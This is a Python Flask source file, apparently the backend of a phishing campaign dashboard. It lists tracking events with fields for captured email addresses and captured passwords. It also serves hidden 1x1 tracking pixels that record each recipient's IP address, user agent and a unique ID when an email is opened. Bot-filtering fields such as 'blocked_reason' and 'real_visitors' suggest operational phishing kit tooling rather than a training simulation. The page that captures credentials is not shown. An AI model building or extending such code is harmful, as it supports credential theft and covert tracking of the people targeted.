from flask import Blueprint, request, jsonify, session
from src.models.user import User
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
from src.models.user import db
import sqlite3
import os

events_bp = Blueprint('events', __name__)

def get_db_connection():
    db_path = os.path.join(os.path.dirname(__file__), '..', 'database', 'app.db')
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    return conn

@events_bp.route('/api/events', methods=['GET'])
def get_events():
    if 'user_id' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    
    try:
        # Get all tracking events for the user's links using SQLAlchemy
        events = db.session.query(TrackingEvent, Link.short_code).join(
            Link, TrackingEvent.link_id == Link.id
        ).filter(
            Link.user_id == session['user_id']
        ).order_by(
            TrackingEvent.timestamp.desc()
        ).limit(1000).all()
        
        events_list = []
        for event, short_code in events:
            events_list.append({
                'id': event.id,
                'timestamp': event.timestamp.isoformat() if event.timestamp else None,
                'tracking_id': short_code,
                'ip_address': event.ip_address,
                'user_agent': event.user_agent,
                'country': event.country or 'Unknown',
                'city': event.city or 'Unknown',
                'isp': event.isp or 'Unknown',
                'captured_email': event.captured_email,
                'captured_password': event.captured_password,
                'status': event.status or 'processed',
                'blocked_reason': event.blocked_reason,
                'email_opened': bool(event.email_opened),
                'redirected': bool(event.redirected),
                'on_page': bool(event.on_page),
                'unique_id': event.unique_id
            })
        
        return jsonify({
            'success': True,
            'events': events_list
        })
        
    except Exception as e:
        print(f"Error fetching events: {e}")
        return jsonify({'error': 'Failed to fetch events'}), 500

@events_bp.route('/api/pixel/<link_id>', methods=['GET'])
def pixel_tracking(link_id):
    """Handle pixel tracking requests"""
    try:
        conn = get_db_connection()
        
        # Get link details
        link = conn.execute(
            'SELECT * FROM links WHERE id = ? OR short_code = ?',
            (link_id, link_id)
        ).fetchone()
        
        if not link:
            conn.close()
            return '', 404
        
        # Get request details
        ip_address = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
        user_agent = request.headers.get("User-Agent", "")
        uid = request.args.get("uid", "")  # Unique identifier parameter
        
        # Simulate geolocation and ISP lookup (replace with actual API calls in production)
        country = "Unknown"
        city = "Unknown"
        isp = "Unknown"
        
        # Determine status based on endpoint (for now, assume pixel hit means email opened)
        email_opened = True
        redirected = False  # This will be set to True when the user is redirected to the target URL
        on_page = False     # This would require a separate signal from the landing page
        
        # Insert tracking event
        conn.execute("""
            INSERT INTO tracking_events 
            (link_id, ip_address, user_agent, country, city, isp, timestamp, status, unique_id, email_opened, redirected, on_page)
            VALUES (?, ?, ?, ?, ?, ?, datetime("now"), "processed", ?, ?, ?, ?)
        """, (link["id"], ip_address, user_agent, country, city, isp, uid, email_opened, redirected, on_page))
        
        # Update link statistics
        conn.execute('''
            UPDATE links 
            SET total_clicks = total_clicks + 1,
                real_visitors = real_visitors + 1
            WHERE id = ?
        ''', (link['id'],))
        
        conn.commit()
        conn.close()
        
        # Return 1x1 transparent pixel
        pixel_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'
        
        return pixel_data, 200, {
            'Content-Type': 'image/png',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        }
        
    except Exception as e:
        print(f"Error in pixel tracking: {e}")
        return '', 500

# Add pixel route with different path patterns
@events_bp.route('/p/<link_id>', methods=['GET'])
def pixel_tracking_short(link_id):
    """Alternative pixel tracking endpoint"""
    return pixel_tracking(link_id)

@events_bp.route('/pixel/<link_id>.png', methods=['GET'])
def pixel_tracking_png(link_id):
    """Pixel tracking with .png extension"""
    return pixel_tracking(link_id)

